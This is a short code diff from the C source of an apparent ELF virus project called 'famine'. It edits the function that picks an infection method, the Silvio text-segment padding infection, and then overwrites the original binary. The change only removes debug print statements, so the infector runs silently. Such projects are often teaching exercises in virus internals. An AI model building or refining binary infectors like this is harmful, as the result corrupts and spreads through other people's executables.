@@ -55,8 +55,6 @@ void apply_infection(t_famine *famine)
             }
             else if (FORCE_SILVIO_TEXT_INFECTION)
             {
-                if (DEBUG == true)
-                    printf("Applying silvio_text infection.\n");
                 silvio_text_infection(famine);
                 overwrite_original_binary(famine);
             }
@@ -67,8 +65,6 @@ void apply_infection(t_famine *famine)
             }
             else if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size < PAGE_SIZE)
             {
-                if (DEBUG == true)
-                    printf("Applying silvio_text infection.\n");
                 silvio_text_infection(famine);
                 overwrite_original_binary(famine);
             }
